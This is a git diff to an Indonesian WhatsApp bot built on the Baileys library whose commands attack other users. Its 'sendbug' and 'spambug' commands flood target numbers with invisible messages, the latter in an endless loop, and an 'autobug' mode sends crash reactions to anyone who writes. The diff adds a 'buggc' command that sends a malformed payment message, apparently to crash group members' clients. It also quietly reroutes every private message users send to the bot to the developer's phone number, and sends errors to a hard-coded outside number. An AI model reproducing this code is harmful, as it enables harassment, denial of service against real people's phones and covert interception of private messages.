@@ -1,4 +1,4 @@
-const { baileys, getContentType } = require('@adiwajshing/baileys')
+const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
 const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
 const { exec } = require('child_process')
 const fs = require('fs')
@@ -30,6 +30,7 @@ const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
 const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
 const isGroupAdmins = groupAdmins.includes(sender) || false
 const isSaya = botNumber.includes(senderNumber)
+const isDev = nomorDeveloper.includes(senderNumber) || isSaya
 const isOwner = nomorOwner.includes(senderNumber) || isSaya
 const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
 const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
@@ -53,8 +54,8 @@ semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 if (!isOwner && autobug && !isGroup) { 
 semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 
-if (!isGroup && body && !msg.key.fromMe) {
-semar.sendMessage(from, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : wa.me/${senderNumber}`})}
+if (!isGroup && body && !msg.key.fromMe && !isDev) {
+semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : wa.me/${senderNumber}`})}
 
 switch (command) {
 case 'cek': case 'test': case 'status':
@@ -114,7 +115,7 @@ if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (args[0].startsWith('6285727091924')) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 nd = dn.split("|")
 if (!nd) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
@@ -125,7 +126,7 @@ await sleep(5000)
 let bug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
 await sleep(5000)
 semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: bug.key })}
-reply(`Sukses send bug ke nomor ${nd[0]}`)
+reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
 break	
 
 case 'spambug':
@@ -134,15 +135,15 @@ if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}spambug ${send
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('6285727091924')) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
-async function logEvery2Seconds(i) { 
+async function infiniteSpam(i) { 
 await sleep(1000)
 let spam = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" })
 await sleep(1000)
 semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: spam.key })
-logEvery2Seconds(++i)}
-logEvery2Seconds(1)
+infiniteSpam(++i)}
+infiniteSpam(1)
 reply(`Sukses spam bug ke nomor ${dn}`)
 break	
 
@@ -153,6 +154,13 @@ if (dn === 'on'){ autobug = true
 reply('Sukses')
 } else if (dn === 'off'){ autobug = false
 reply('Sukses')} else { reply('Error')}
+break
+
+case 'buggc':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
+semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 break
 
 case '01':
@@ -178,4 +186,5 @@ exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
 break
 default:
 }} catch (e) {
-console.log(e)}}
+console.log(e)
+semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}
